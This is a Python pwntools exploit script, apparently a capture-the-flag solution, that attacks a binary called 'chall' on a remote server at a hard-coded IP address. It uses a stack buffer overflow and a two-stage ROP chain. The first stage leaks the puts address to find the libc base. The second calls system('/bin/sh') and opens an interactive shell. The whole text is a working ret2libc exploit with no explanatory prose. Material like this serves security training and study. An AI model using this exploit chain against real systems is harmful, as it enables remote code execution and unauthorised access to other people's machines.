import syslog

from pwn import *

libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
elf = ELF("chall")
offset = 40
rop = ROP(elf.path)
r = remote("34.121.211.139", 3333)

payload = b'A' * offset
payload += p64(rop.find_gadget(['pop rdi'])[0])
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])

r.sendlineafter("input:", "-1")
r.recvuntil("\n")
r.sendline(payload)
r.recvuntil("\n")

puts = u64(r.recv(6).ljust(8, b"\x00"))
libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))
log.success("libc_base leaked --> %s" % hex(libc_base))

payload = b'A' * offset
payload += p64(rop.find_gadget(['pop rdi'])[0])
payload += p64(binsh)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(system)
r.sendlineafter("input:", "-1")
r.recvuntil("\n")
r.sendline(payload)
r.interactive()
